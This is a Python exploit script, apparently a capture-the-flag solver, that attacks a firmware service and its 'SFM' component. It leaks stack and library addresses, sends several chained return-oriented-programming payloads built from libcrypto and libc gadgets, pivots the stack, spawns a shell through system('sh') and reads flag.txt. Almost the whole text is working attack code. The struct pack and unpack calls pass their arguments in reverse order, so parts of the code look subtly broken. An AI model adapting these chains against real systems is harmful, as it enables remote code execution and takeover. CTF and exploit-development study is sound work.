import os
import socket
import sys
import time
import binascii
import struct

u64 = lambda x: struct.unpack(x, "<Q")[0]
p16 = lambda x: struct.pack(x, "<H")
p64 = lambda x: struct.pack(x, "<Q")

read_syscall = 0x66d
write_syscall = 0x677

sfm_libcrypto_off = 0x349fa7
add_rsp = 0x204076
libcrypto_write_got = 0x43ce90
libcrypto_write_thunk = 0xb3054
libcrypto_read_thunk = 0xb2a90
libcrypto_ret = 0xe106c
libcrypto_pop_rdi = 0xb71db
libcrypto_pop_rsi = 0xba534
libcrypto_pop_rdx = 0x2b89d3
libcrypto_pop_rsp = 0xb726c

libc_write_off = 0x114a20
libc_system_off = 0x50d60

def prepare_chain2(firmware_base,
                   stack_leak,
                   pop_rdi,
                   pop_rsi,
                   pop_rdx,
                   pop_rsp):

    new_msg_addr = stack_leak - 0x1000

    modify_msg  = b"\x00\x00\x00\x00"
    modify_msg += p16(3) + p16(0)
    modify_msg += b"\x00\x00\x00\x00"
    modify_msg += b"\x00\x00\x00\x00"
    modify_msg += (b"\xf0" * 51 + b"\x41").ljust(64, b"\x00")
    modify_msg += b"\x00" * 16 #p64(libcrypto_base + add_rsp).ljust(16, b"\x00")
    modify_msg += p64(0)
    modify_msg += b"\x00\x00\x00\x00"

    certify_msg  = b"\x00\x00\x00\x00"
    certify_msg += p16(6) + p16(0)
    certify_msg += p64(0)
    certify_msg += b"A" * 1024

    # part 2.a read in a the overflow modify message
    chain  = p64(firmware_base + pop_rdi)
    chain += p64(0)
    chain += p64(firmware_base + pop_rsi)
    chain += p64(new_msg_addr)
    chain += p64(firmware_base + pop_rdx)
    chain += p64(len(modify_msg))
    chain += p64(firmware_base + read_syscall)

    # part 2.b send the message back out to SFM
    chain += p64(firmware_base + pop_rdi)
    chain += p64(3)
    chain += p64(firmware_base + pop_rsi)
    chain += p64(new_msg_addr)
    chain += p64(firmware_base + pop_rdx)
    chain += p64(len(modify_msg))
    chain += p64(firmware_base + write_syscall)

    # part 2.c read out the response code to clear out the pipe
    chain += p64(firmware_base + pop_rdi)
    chain += p64(3)
    chain += p64(firmware_base + pop_rsi)
    chain += p64(new_msg_addr)
    chain += p64(firmware_base + pop_rdx)
    chain += p64(4)
    chain += p64(firmware_base + read_syscall)

    # part 3.a read in certify message with rop chain
    chain += p64(firmware_base + pop_rdi)
    chain += p64(0)
    chain += p64(firmware_base + pop_rsi)
    chain += p64(new_msg_addr)
    chain += p64(firmware_base + pop_rdx)
    chain += p64(len(certify_msg))
    chain += p64(firmware_base + read_syscall)

    # part 3.b send the message out to SFM
    chain += p64(firmware_base + pop_rdi)
    chain += p64(3)
    chain += p64(firmware_base + pop_rsi)
    chain += p64(new_msg_addr)
    chain += p64(firmware_base + pop_rdx)
    chain += p64(len(certify_msg))
    chain += p64(firmware_base + write_syscall)

    # part 3.c we're done with launcher just stall here
    chain += p64(firmware_base + pop_rdi)
    chain += p64(3)
    chain += p64(firmware_base + pop_rsi)
    chain += p64(new_msg_addr)
    chain += p64(firmware_base + pop_rdx)
    chain += p64(8)
    chain += p64(firmware_base + read_syscall)

    chain += p64(firmware_base + pop_rdi)
    chain += p64(3)
    chain += p64(firmware_base + pop_rsi)
    chain += p64(new_msg_addr)
    chain += p64(firmware_base + pop_rdx)
    chain += p64(8)
    chain += p64(firmware_base + read_syscall)

    return (modify_msg, certify_msg, chain)

def do_exploit(sock):
    sock.readuntil("> ")
    sock.sendline("upload")

    stage_1 = open('bad_blob.raw', 'rb').read()
    encode_stage_1 = binascii.hexlify(stage_1)
    print("len(encoded_stage_1): %d" % len(encode_stage_1))

    pop_rdi = stage_1.find(b"\x5f\xc3")
    pop_rsi = stage_1.find(b"\x5e\xc3")
    pop_rdx = stage_1.find(b"\x5a\xc3")
    pop_rsp = stage_1.find(b"\x5c\xc3")

    sock.sendline(encode_stage_1)

    sock.readuntil("> ")
    sock.sendline("run")

    #stage_2 = open('stage2.text', 'rb').read()
    #sock.readuntil("< ")
    #sock.send(stage_2)
    #sock.sendline(stage_2)

    leak = sock.recv(0x100)

    print("got leak")
    with open('leak', 'wb') as f:
        f.write(leak)

    firmware_base = u64(leak[0x18:0x20]) & ~(0x1000-1)
    stack_leak = (u64(leak[0x10:0x18]) & ~(0x1000-1)) - 0x1000
    print("Firmware base %x, Stack base %x" % (firmware_base, stack_leak))
    print("pop rdi off %x\n" % pop_rdi)
    print("pop rsi off %x\n" % pop_rsi)
    print("pop rdx off %x\n" % pop_rdx)
    print("pop rsp off %x\n" % pop_rsp)

    chain  = p64(0x4141414142424242) # junk

    attest_msg  = b"\x00\x00\x00\x00"
    attest_msg += p16(7) + p16(0)
    attest_msg += p16(4)

    # part 1.a read in leak attest quote message
    chain += p64(firmware_base + pop_rdi)
    chain += p64(0)
    chain += p64(firmware_base + pop_rsi)
    chain += p64(stack_leak)
    chain += p64(firmware_base + pop_rdx)
    chain += p64(len(attest_msg))
    chain += p64(firmware_base + read_syscall)

    # part 1.b send off that message
    chain += p64(firmware_base + pop_rdi)
    chain += p64(3)
    chain += p64(firmware_base + pop_rsi)
    chain += p64(stack_leak)
    chain += p64(firmware_base + pop_rdx)
    chain += p64(len(attest_msg))
    chain += p64(firmware_base + write_syscall)

    # part 1.c read the leak back from sfm
    chain += p64(firmware_base + pop_rdi)
    chain += p64(3)
    chain += p64(firmware_base + pop_rsi)
    chain += p64(stack_leak)
    chain += p64(firmware_base + pop_rdx)
    chain += p64(0x400)
    chain += p64(firmware_base + read_syscall)

    # part 1.d write that leak out to us
    chain += p64(firmware_base + pop_rdi)
    chain += p64(1)
    chain += p64(firmware_base + pop_rsi)
    chain += p64(stack_leak)
    chain += p64(firmware_base + pop_rdx)
    chain += p64(0x100)
    chain += p64(firmware_base + write_syscall)

    modify_msg, certify_msg, chain2 = prepare_chain2(firmware_base,
                                                     stack_leak,
                                                     pop_rdi,
                                                     pop_rsi,
                                                     pop_rdx,
                                                     pop_rsp)

    # read in part 2
    chain += p64(firmware_base + pop_rdi)
    chain += p64(0)
    chain += p64(firmware_base + pop_rsi)
    chain += p64(stack_leak)
    chain += p64(firmware_base + pop_rdx)
    chain += p64(len(chain2))
    chain += p64(firmware_base + read_syscall)

    # transition to part 2
    chain += p64(firmware_base + pop_rsp)
    chain += p64(stack_leak)

    chain  = chain.ljust(1968, b"\x61")

    #time.sleep(3) 
    sock.send(chain)

    time.sleep(1)
    sock.send(attest_msg)

    time.sleep(1)
    sfm_leak = sock.recv(0x100)
    sfm_heap = u64(sfm_leak[8*10:8*10+8])
    sfm_libcrypto_base = u64(sfm_leak[0x98:0xa0]) - sfm_libcrypto_off
    print("SFM libcrypto base %x" % sfm_libcrypto_base)

    sock.send(chain2)

    # next, wait for sending the modify_msg
    time.sleep(1)
    # crack open modify_msg and add the add_rsp gadget
    modify_msg = modify_msg[:80] + p64(sfm_libcrypto_base + add_rsp) + modify_msg[88:]
    sock.send(modify_msg)

    # wait for certify_msg
    time.sleep(1)
    chain3  = certify_msg[:0x240]
    chain3 += p64(sfm_libcrypto_base + libcrypto_ret)
    chain3 += p64(sfm_libcrypto_base + libcrypto_ret)
    chain3 += p64(sfm_libcrypto_base + libcrypto_ret)
    chain3 += p64(sfm_libcrypto_base + libcrypto_ret)
    # part 4.a  write out the libc leak
    chain3 += p64(sfm_libcrypto_base + libcrypto_pop_rdi)
    chain3 += p64(1)
    chain3 += p64(sfm_libcrypto_base + libcrypto_pop_rsi)
    chain3 += p64(sfm_libcrypto_base + libcrypto_write_got)
    chain3 += p64(sfm_libcrypto_base + libcrypto_pop_rdx)
    chain3 += p64(8)
    chain3 += p64(sfm_libcrypto_base + libcrypto_write_thunk)

    # part 4.b read in new chain which abuses libc leak
    chain3 += p64(sfm_libcrypto_base + libcrypto_pop_rdi)
    chain3 += p64(0)
    chain3 += p64(sfm_libcrypto_base + libcrypto_pop_rsi)
    chain3 += p64(sfm_heap)
    chain3 += p64(sfm_libcrypto_base + libcrypto_pop_rdx)
    chain3 += p64(0x100)
    chain3 += p64(sfm_libcrypto_base + libcrypto_read_thunk)

    # part 4.c pivot stack to heap
    chain3 += p64(sfm_libcrypto_base + libcrypto_pop_rsp)
    chain3 += p64(sfm_heap)

    sock.send(chain3)

    sfm_libc_base = u64(sock.recv(8)) - libc_write_off
    print("SFM libc base %x" % sfm_libc_base)

    # part 5 system("sh")
    chain4  = p64(sfm_libcrypto_base + libcrypto_pop_rdi)
    chain4 += p64(sfm_heap + 0x18)
    chain4 += p64(sfm_libc_base + libc_system_off)
    chain4 += p64(0x6873)
    chain4 += p64(0x4141414142424242)

    sock.send(chain4)

    time.sleep(1)

    sock.sendline("cat flag.txt")
    return sock.recv(1024)

HOST = os.environ["HOST"]
PORT = int(os.environ["PORT"])

TICKET = None if "TICKET" not in os.environ else os.environ["TICKET"]

from pwn import *

sock = remote(HOST, PORT)

if TICKET is not None:
    sock.readuntil("Ticket please: ")
    sock.send((TICKET + "\n").encode("utf-8"))

time.sleep(1)

flag = do_exploit(sock)

print(flag)

if "flag{" in flag.decode("utf-8"):
    print("PASS")
    sys.exit(0)
else:
    print("FAIL")
    sys.exit(1)
